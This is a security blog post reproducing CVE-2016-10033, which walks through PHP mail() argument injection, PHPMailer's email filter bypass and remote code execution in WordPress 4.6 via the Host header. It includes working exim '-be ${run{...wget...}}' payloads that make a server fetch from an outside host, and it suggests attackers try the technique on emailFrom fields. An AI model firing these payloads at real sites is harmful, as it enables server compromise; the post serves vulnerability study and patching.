---
layout: post
title:  "From C code to CMS software: Getting RCE in Wordpress 4.6 thanks to ArgumentI"
categories: OffensiveAppSec
tags:  CommandI
author: Alvaro Folgado (@rebujacker)
---

* content
{:toc}


![](/images/phpmailerintro.jpg)

## Introduction

This is the first post within the category: "CVEReproduction". In these series I will use existing reported CVE's or vulnerabilities and try to reproduce it correctly. The objective here is to use learned Attack Vectors in "TheoricalPractise" and to see how this works in real software. As in the previous Sections, this will be always supported by a PoC using vulnerable software. Inside [Poc Section](http://afolgado.com/poc/) we have everything we need to reproduce it, and the vulnerable code/software.

PHPMailer PoC is very similar to [Php:CommandI&ArgumentI](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/). First function is using PHP mail() and second one is using the default PHPMailer configuration to send an email.
To test the Wordpress vulnerability we will need old wordpress 4.6 and an old apache server version (tested on Ubuntu 10.04/apache 2.2.14).


## Argument Injection as a functionality: PHP mail() 

In the last post we talked about the different dangerous functions that can be prone to Command Injection and Argument Injection. Those are obvious dangerous functions, but sometimes, programming languages provide us with more functions that we don't know yet that could be unsafe. Developers doesn't know sometimes this as well when they are coding, or they don't know the 100% functionailities of some functions (something we can extend to the use of any third party library software). This 'new' dangerous function is the basic mail function in PHP. This function receive a bunch of parameters as we can see in the PHP 7 source code.

php-7.1.6/ext/standard/mail.c:

```c

PHPAPI int php_mail(char *to, char *subject, char *message, char *headers, char *extra_cmd)
{
[...]
#endif
	}
	if (extra_cmd != NULL) {
		spprintf(&sendmail_cmd, 0, "%s %s", sendmail_path, extra_cmd);
	} else {
		sendmail_cmd = sendmail_path;
	}

#if PHP_SIGCHILD
	/* Set signal handler of SIGCHLD to default to prevent other signal handlers
	 * from being called and reaping the return code when our child exits.
	 * The original handler needs to be restored after pclose() */
	sig_handler = (void *)signal(SIGCHLD, SIG_DFL);
	if (sig_handler == SIG_ERR) {
		sig_handler = NULL;
	}
#endif

#ifdef PHP_WIN32
	sendmail = popen_ex(sendmail_cmd, "wb", NULL, NULL);
#else
	/* Since popen() doesn't indicate if the internal fork() doesn't work
	 * (e.g. the shell can't be executed) we explicitly set it to 0 to be
	 * sure we don't catch any older errno value. */
	errno = 0;
	sendmail = popen(sendmail_cmd, "w");
#endif
	if (extra_cmd != NULL) {
		efree (sendmail_cmd);
	}
[...]

```

In first instance, after look at this C code we can think that "popen" as a dangerous function in C, is being called without any kind of precaution. A test using our previous "commandebugger" bash script shows a funny result (more about of commandebugger tool [here](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/)).

```bash
Payload in emailFrom:
ss@email.com;wget http://127.0.0.1/test

Result catched by commanddebugger:
Received: /usr/sbin/sendmail
Received: -fss@email.com;wget
Received: http://127.0.0.1/test
```

As we can see,the input is being escaped to avoid the injection of shell meta-characters, but is leaving the opportunity to add extra Arguments/Options to the sendmail binary. The escaping code is found also in mail.c file:

php-7.1.6/ext/standard/mail.c:
```c
[...]

	if (force_extra_parameters) {
		extra_cmd = php_escape_shell_cmd(force_extra_parameters);
	} else if (extra_cmd) {
		extra_cmd = php_escape_shell_cmd(ZSTR_VAL(extra_cmd));
	}

[...]
```

Although mail() is not vulnerable to Command Injection, Argument Injection is possible (as a functionality pointed by the same name 'extra_arguments'). The use of mail() wildy in other libraries/software without precaution will be hazardous. We can consider mail() a dangerous function and I have added it to [Research-Guide](http://www.afolgado.com/researchguide/).

To demonstrate this, let's apply a working payload in the PHP mail function and see how it works (using our commandebugger bash script). Let's use the last payload from [PHP Argument Injection](http://www.afolgado.com/2017/06/10/phpcommandiargumenti/), since we know is being 'CommandI escaped', let's use the working payload for the Argument Injection:

```bash
Payload:
ss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}

Debugger output:
root@ubuntu:/home/ubuntu# cat /tmp/outgoing-command 
Received: /usr/sbin/sendmail
Received: -fss@email.com
Received: -be
Received: ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}
Received:
Received:
```

As we can see this will perform correctly the Argument Injection over an uncontrolled PHP mail() function.


## CVE-2016-10033: The uncontrolled use of mail() by PHPMailer

Now we have explained the dangerous use of mail() in PHP, let's talk about real playgrounds: PHPMailer.
This third party library help developers to send emails with a lot of different configurations, we can install it in our PHP projects using for example PHP composer. As we can see in this PoC, second option/button send an email by crafting a PHPMailer object with default configurations:


\poc.php

```php
[...]
$mail = new PHPMailer;

$mail->setfrom($emailFrom,'Bob');
//$mail->From = $emailFrom; ==> If we use this, Sender will be empty.

$mail->addAddress($emailTo, 'Alice');

$mail->Body    = $body;

error_log($mail->Sender,0);

if(!$mail->send()) {
[...]
```

Let's look deeper at what is happening inside PHPMailer when we create the PHPMailer object and we trigger the method 'send' with minimum/default configurations:

/phpmailer/class.phpmailer.php

1.'Send' method is called from object 'PHPMailer':

```php
[...]

  public function send()
    {
        try {
            if (!$this->preSend()) {
                return false;
            }
            return $this->postSend();
        } catch (phpmailerException $exc) {
            $this->mailHeader = '';
            $this->setError($exc->getMessage());
            if ($this->exceptions) {
                throw $exc;
            }
            return false;
        }
    }

[...]
```

2.PostSend() is called within send():

```php
[...]
 public function postSend()
    {
        try {
            // Choose the mailer and send through it
            switch ($this->Mailer) {
                case 'sendmail':
                case 'qmail':
                    return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody);
                case 'smtp':
                    return $this->smtpSend($this->MIMEHeader, $this->MIMEBody);
                case 'mail':
                    return $this->mailSend($this->MIMEHeader, $this->MIMEBody);
                default:
                    $sendMethod = $this->Mailer.'Send';
                    if (method_exists($this, $sendMethod)) {
                        return $this->$sendMethod($this->MIMEHeader, $this->MIMEBody);
                    }
[...]
```

3.Default configurations of the PHPMailer object will trigger method 'mailSend':

```php
[...]
protected function mailSend($header, $body)
    {
        $toArr = array();
        foreach ($this->to as $toaddr) {
            $toArr[] = $this->addrFormat($toaddr);
        }
        $to = implode(', ', $toArr);

        $params = null;
        //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver
        if (!empty($this->Sender)) {
            error_log($this->Sender,0);
            $params = sprintf('-f%s', $this->Sender);
        }
        if ($this->Sender != '' and !ini_get('safe_mode')) {
            $old_from = ini_get('sendmail_from');
            ini_set('sendmail_from', $this->Sender);
        }
        $result = false;
        if ($this->SingleTo and count($toArr) > 1) {
            foreach ($toArr as $toAddr) {
                $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params);
                $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From);
[...]
```
Carefully let's see how $params variable is passed into 'mailPassthru' without any kind of Argument Injection Escaping.
Also is very important for later the fact that ***"Sender" attribute*** is present in the PHPMailer object. If Sender attribute is not present, extra parameters will not be crafted alongside with the dangerous input "emailFrom".

Sender attribute will be set automatically set by some methods like "setfrom()":

```php
[...]
    public function setFrom($address, $name = '', $auto = true)
    {
        $address = trim($address);
        $name = trim(preg_replace('/[\r\n]+/', '', $name)); //Strip breaks and trim
        // Don't validate now addresses with IDN. Will be done in send().
        if (($pos = strrpos($address, '@')) === false or
            (!$this->has8bitChars(substr($address, ++$pos)) or !$this->idnSupported()) and
            !$this->validateAddress($address)) {
            $error_message = $this->lang('invalid_address') . " (setFrom) $address";
            $this->setError($error_message);
            $this->edebug($error_message);
            if ($this->exceptions) {
                throw new phpmailerException($error_message);
            }
            return false;
        }
        $this->From = $address;
        $this->FromName = $name;
        if ($auto) {
            if (empty($this->Sender)) {
                $this->Sender = $address;
            }
        }
        return true;
    }
[...]
```

But if developer decides to set PHPMailer attributes by hand, and forgot about Sender, function will stop to be vulnerable (since mailsend() will not feed mail() with 'extraParams').


4.At last we arrive to mailPassthru(). The function in PHPMailer that calls PHP mail().

```php
[...]
    private function mailPassthru($to, $subject, $body, $header, $params)
    {
        //Check overloading of mail function to avoid double-encoding
        if (ini_get('mbstring.func_overload') & 1) {
            $subject = $this->secureHeader($subject);
        } else {
            $subject = $this->encodeHeader($this->secureHeader($subject));
        }
        //Can't use additional_parameters in safe_mode
        //@link http://php.net/manual/en/function.mail.php
        if (ini_get('safe_mode') or !$this->UseSendmailOptions) {
            $result = @mail($to, $subject, $body, $header);
        } else {
            $result = @mail($to, $subject, $body, $header, $params);
[...]
```

In first instance, it looks like we can just use the same payload that we used for mail() but we can see that is not working conrrectly:

```bash
Payload:
ss@email.com -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}

Commandebugger:
Received: /usr/sbin/sendmail
Received:
Received:
Received:
```

Extra parameters are being blocked, this is due to the 'email Format' filter applied by PHPMailer in "presend()" function:

```php
[...]
public static function validateAddress($address, $patternselect = null)
    {

[...]

switch ($patternselect) {
            case 'pcre8':
                /**
                 * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.
                 * @link http://squiloople.com/2009/12/20/email-address-validation/
                 * @copyright 2009-2010 Michael Rushton
                 * Feel free to use and redistribute this code. But please keep this copyright notice.
                 */
                return (boolean)preg_match(
                    '/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' .
                    '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' .
                    '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .
                    '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .
                    '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' .
                    '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' .
                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' .
                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .
                    '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',
                    $address
                );
[...]
```

Fortunately, LegalHackers studied ways to bypass this blockage using as reference the email RFC where we should be able to use spaces (This is very well explained by them, the link in the References Section). They have gave us information about how to bypass 'pcre8' email filter. If other filter pattern is used in PHPMailer, the exploit will not work correctly.

```bash
Payload:
email@dd(tmp1 -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}} tmp2)

Commandeugger:
Received: /usr/sbin/sendmail
Received: -femail@dd(tmp1
Received: -be
Received: ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}}
Received: tmp2)
```

Finally we have a working exploit for **CVE-2016-1033, when attacker has access to the 'emailFrom' input**.


## Wordpress 4.6 Remote Code Execution

When a common used third party library as PHPMailer get compromised, a lot of softwares could get bitten by the exploit. Wordpress 4.6 was one of them. In this last section we are going to exploit it, reviewing the source code of Wordpress to understand exactly what is going on.
For this, no PoC have been created, because we will use directly a vulnerable version of wordpress instead. Pre-requisites for this to work are [here](https://github.com/AlvFolgado/CVEPoCs/blob/master/PHP/ArgumentI/cve201610033/PocGuide.txt).

Following the existing RCE documentation, we know that the vulnerable parameter is the Hostname HTTP Header in the "lostpassword" function of wordpress 4.6

wordpress4.6/wp-includes/pluggable.php:

```php

	if ( !isset( $from_email ) ) {
		// Get the site domain and get rid of www.
		$sitename = strtolower( $_SERVER['SERVER_NAME'] );
		if ( substr( $sitename, 0, 4 ) == 'www.' ) {
			$sitename = substr( $sitename, 4 );
		}

		$from_email = 'wordpress@' . $sitename;
	}

[...]
	
	$phpmailer->setFrom( $from_email, $from_name);
```
As we can see, '$from_email' is being crafted using the 'SERVER_NAME' that actually comes from the cited HTTP HOST Header.

Natural thing to do will be testing the same payload we did in previous PoC but erasing the "email@" part from it. Let's see what happens (we need to use some script or proxy tool):

Payload:
dd(tmp1 -be ${run{/usr/bin/wget${substr{10}{1}{$tod_log}}http://127.0.0.1/test}} tmp2)

![](/images/wordpress46request.png)

Bad request is being responded. Apache Server will not let us to put that HOSTNAME Header with '/' symbols. Fortunately, again, LegalHackers have resolved this problem by studying the env. variables from exim4 (more information in suggested posts). Once again we perform the Request with the valid payload:

```bash
Payload:
ddd.com(tmp1 -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}192.168.122.154${substr{0}{1}{$spool_directory}}test}} tmp2)

Commandebugger:
Received: /usr/sbin/sendmail
Received: -t
Received: -i
Received: -fwordpress@ddd.com(tmp1
Received: -be
Received: ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}wget${substr{10}{1}{$tod_log}}192.168.122.154${substr{0}{1}{$spool_directory}}test}}
Received: tmp2)
Received:
```

It is important to point that modern versions of Apache Server will not let to put in HOSTNAME even spaces...so the Payload will not work in modern versions of it.

Now last question is: **Why this doesn't work in previous versions of Wordpress? Why only 4.6?**

wordpress4.5/wp-includes/pluggable.php:
```php
	if ( !isset( $from_email ) ) {
		// Get the site domain and get rid of www.
		$sitename = strtolower( $_SERVER['SERVER_NAME'] );
		if ( substr( $sitename, 0, 4 ) == 'www.' ) {
			$sitename = substr( $sitename, 4 );
		}

		$from_email = 'wordpress@' . $sitename;
	}

	$phpmailer->From = apply_filters( 'wp_mail_from', $from_email );

```

We spoke before about this subject. In previous version of Wordpress 'setAddress()' is not being used, instead the PHPMailer object is being accessed manually. This will disable the 'extra_params' option, and spoil our opportunity to exploit it (since 'Sender' is not being set).

## Conclusions

As a **Defender** let's update our software and third party libraries. For example, by having either a latest version of PHPMailer,Wordpress or even Apache Server, the last RCE for wordpress 4.6 will not be possible.

As an **Attacker** if we know the target web application is running PHP and we have access to a 'emailFrom' parameter in any function as 'contactme,forgetpassword,etc...' it will worth the shot to try this. Knowing the target used technology is an useful tool to hack into it.


## References

[PHPMAILER CVE-2016-10033](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html)



